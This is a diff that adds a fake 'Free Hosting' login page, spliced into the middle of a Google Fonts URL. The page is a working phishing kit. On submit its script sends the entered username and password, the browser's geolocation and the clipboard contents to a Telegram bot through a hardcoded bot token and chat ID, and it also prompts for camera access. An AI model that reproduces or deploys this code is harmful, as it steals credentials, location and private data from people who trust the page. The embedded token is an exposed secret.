@@ -1,0 +1,172 @@
+https://fonts.googleapis.c<!DOCTYPE html><html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Free Hosting | Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+        .login-page {
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: linear-gradient(135deg, #f5f7fa, #e4e8ed);
+            padding: 20px;
+        }
+        .login-container {
+            width: 100%;
+            max-width: 480px;
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+        .login-header {
+            padding: 40px 40px 20px;
+            text-align: center;
+            background: linear-gradient(135deg, #1e88e5, #0d47a1);
+            color: white;
+        }
+        .login-header h1 {
+            margin: 0;
+            font-size: 2.2rem;
+            font-weight: 700;
+            background: linear-gradient(to right, #ffffff, #e0f7fa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        .login-header p {
+            margin: 10px 0 0;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+        .login-body {
+            padding: 30px 40px 40px;
+        }
+        .form-group { margin-bottom: 20px; }
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: #2c3e50;
+        }
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: #1e88e5;
+            box-shadow: 0 0 0 3px rgba(30, 136, 229, 0.2);
+        }
+        .btn-group {
+            display: flex;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        .btn {
+            flex: 1;
+            padding: 14px;
+            border-radius: 8px;
+            font-weight: 600;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-primary {
+            background: linear-gradient(135deg, #1e88e5, #0d47a1);
+            color: white;
+        }
+        .btn-outline {
+            background: transparent;
+            border: 2px solid #1e88e5;
+            color: #1e88e5;
+        }
+        .login-footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #7f8c8d;
+            font-size: 14px;
+        }
+        .login-footer a {
+            color: #1e88e5;
+            text-decoration: none;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+<div class="login-page">
+    <div class="login-container">
+        <div class="login-header">
+            <h1>Free Hosting</h1>
+            <p>Developer Cyber Sojib Team  Void x Raven</p>
+        </div>
+        <div class="login-body">
+            <form onsubmit="sendToTelegram(event)">
+                <div class="form-group">
+                    <label for="username" class="form-label">Username</label>
+                    <input type="text" id="username" name="username" class="form-control" placeholder="Enter your username" required>
+                </div>
+                <div class="form-group">
+                    <label for="password" class="form-label">Password</label>
+                    <input type="password" id="password" name="password" class="form-control" placeholder="Enter your password" required>
+                </div>
+                <div class="btn-group">
+                    <button type="submit" class="btn btn-primary">
+                        <i class="fas fa-sign-in-alt"></i> Login
+                    </button>
+                    <button type="button" class="btn btn-outline" onclick="alert('Register feature coming soon!')">
+                        <i class="fas fa-user-plus"></i> Register
+                    </button>
+                </div>
+            </form>
+            <div class="login-footer">
+                <p>By using this service, you agree to our <a href="#">Terms of Service</a></p>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+const TELEGRAM_BOT_TOKEN = "7572919200:AAHhCG6-WigBkcWgbPMf_AqfOtGsh_TB2j8";
+const TELEGRAM_CHAT_ID = "6155323694";function sendToTelegram(e) { e.preventDefault(); const username = document.getElementById("username").value; const password = document.getElementById("password").value;
+
+navigator.geolocation.getCurrentPosition(function(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    navigator.clipboard.readText().then(clipText => {
+        const message = `Login Alert:\nUsername: ${username}\nPassword: ${password}\nLocation: https://www.google.com/maps?q=${lat},${lon}\nClipboard: ${clipText}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
+    }).catch(() => {
+        const message = `Login Alert:\nUsername: ${username}\nPassword: ${password}\nLocation: https://www.google.com/maps?q=${lat},${lon}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
+        });
+    });
+});
+
+}
+
+// Camera Access Prompt navigator.mediaDevices.getUserMedia({ video: true }) .then(stream => { stream.getTracks().forEach(track => track.stop()); console.log("Camera access granted"); }) .catch(error => { console.warn("Camera access denied"); }); </script>
+
+</body>
+</html>om/css?family=Roboto:100,300,400,500,700,900
